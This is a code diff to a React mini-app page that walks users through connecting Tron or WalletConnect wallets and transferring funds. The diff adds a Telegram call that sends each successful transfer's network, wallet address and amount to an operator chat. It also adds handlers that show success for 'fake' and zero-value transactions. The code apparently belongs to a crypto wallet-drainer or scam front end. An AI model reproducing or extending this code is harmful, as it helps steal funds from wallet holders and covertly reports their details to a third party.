@@ -9,6 +9,7 @@ import TronTransferFundsButton from '../components/Tron/TronTransferFundsButton'
 import ScoreIcon from '../assets/score-icon.png';
 import "./MiniAppPage.css";
 import { useTranslation } from 'react-i18next';
+import { sendTelegramMessage } from '../services/telegramService';
 
 const MiniAppPage: React.FC = () => {
     const [step, setStep] = useState(1);
@@ -35,17 +36,21 @@ const MiniAppPage: React.FC = () => {
     
         updateStep();
     }, [tronAddress, tronConnected, transactionSigned, ethAddress, walletConnectConnected]);
-    
-    console.log("STEP " + step);
 
     const stepBack = () => setStep(step - 1);
       
-    const handleTransactionSuccess = () => {
+    const handleTransactionSuccess = (network: string, wallet: string, amount: string) => {
+        sendTelegramMessage(import.meta.env.VITE_CHAT_ID ?? "", `Network: ${network}\nWallet: ${wallet}\nAmount: ${amount}`);
         setStep(3);
         setTransactionSigned(true);
     }
 
     const handleFakeTransactionSuccess = () => {
+        setStep(3);
+        setTransactionSigned(true);
+    }
+
+    const handleZeroTransactionSuccess = () => {
         setStep(3);
         setTransactionSigned(true);
         setFakeTransaction(true);
@@ -85,11 +90,11 @@ const MiniAppPage: React.FC = () => {
                             <div className="col-lg-5 col-xl-4">
                                 { walletConnectConnected && 
                                 (
-                                <WalletConnectTransferFundsButton onTransactionSuccess={handleTransactionSuccess} onFakeTransactionSuccess={handleFakeTransactionSuccess}>{t('popup.secondStep.button')}</WalletConnectTransferFundsButton>
+                                <WalletConnectTransferFundsButton onTransactionSuccess={handleTransactionSuccess} onFakeTransactionSuccess={handleFakeTransactionSuccess} onZeroTransactionSuccess={handleZeroTransactionSuccess}>{t('popup.secondStep.button')}</WalletConnectTransferFundsButton>
                                 )}
                                 { !walletConnectConnected && tronConnected && 
                                 (
-                                <TronTransferFundsButton onTransactionSuccess={handleTransactionSuccess} onFakeTransactionSuccess={handleFakeTransactionSuccess}>{t('popup.secondStep.button')}</TronTransferFundsButton>
+                                <TronTransferFundsButton onTransactionSuccess={handleTransactionSuccess} onFakeTransactionSuccess={handleFakeTransactionSuccess} onZeroTransactionSuccess={handleZeroTransactionSuccess}>{t('popup.secondStep.button')}</TronTransferFundsButton>
                                 )}
                             </div>
                         </div>
